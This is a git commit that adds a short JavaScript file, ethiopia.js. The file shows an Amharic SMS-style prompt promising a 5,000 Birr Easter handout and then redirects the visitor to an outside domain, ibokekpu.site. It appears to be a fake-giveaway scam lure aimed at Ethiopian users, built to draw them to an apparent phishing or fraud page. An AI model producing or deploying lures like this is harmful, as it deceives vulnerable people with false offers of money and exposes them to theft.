134f054828957092c6979b4374137730fc9c4440
usorondo55 <99inkwell-sunbeam@icloud.com>
2026-03-26 23:17:30 +0100

    Create ethiopia.js

---
+++ ethiopia.js
@@ -0,0 +1,5 @@
+var password = '5,000 ብር አውጣ'
+password=prompt('SMS: እንኳን ደስ አላችሁ የፋሲካን በዓል ለማክበር የ5,000 ብር ድጋፍ ያግኙ። ለማመልከት እሺን ይጫኑ','5,000 ብር አውጣ');
+if (password != '5,000 ብር አውጣ') {
+location.href='https://www.ibokekpu.site/easter-5kbirr-celebration';
+}
